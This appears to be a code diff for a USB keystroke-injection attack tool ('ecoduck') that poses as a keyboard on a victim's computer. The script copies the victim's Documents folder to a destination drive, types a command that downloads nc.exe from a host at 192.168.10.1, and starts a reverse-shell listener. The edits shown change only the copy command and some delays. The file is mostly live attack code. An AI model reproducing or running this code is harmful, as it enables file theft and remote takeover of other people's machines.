@@ -12,7 +12,7 @@ $destinationFolder = "$mydrive\\$foldername"
 if (!(Test-Path -path $destinationFolder)) {New-Item $destinationFolder -Type Directory}
 $target = [Environment]::GetFolderPath("MyDocuments")
 ls $target
-cp -r $target $destinationFolder
+Copy-Item -Path $target/* -Destination $destinationFolder -recurse -Force -Verbose
 Write-Host "The file sync is complete." """
 
 def reverse_shell_listener():
@@ -51,7 +51,7 @@ def payload():
 	sleep(1)
 	eco.type("wget http://192.168.10.1:8000/nc.exe -OutFile nc.exe")
 	eco.press("ENTER")
-	sleep(5)
+	sleep(2)
 
 	shelllistener=Process(target=reverse_shell_listener)
 	shelllistener.start()
@@ -93,6 +93,6 @@ while(1):
 		else:
 			os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-other/UDC")
 		os.system("ls /sys/class/udc > /sys/kernel/config/usb_gadget/ecoduck-simple/UDC")
-		sleep(2)
+		sleep(4)
 		eco.wait_for_disconnect()
 
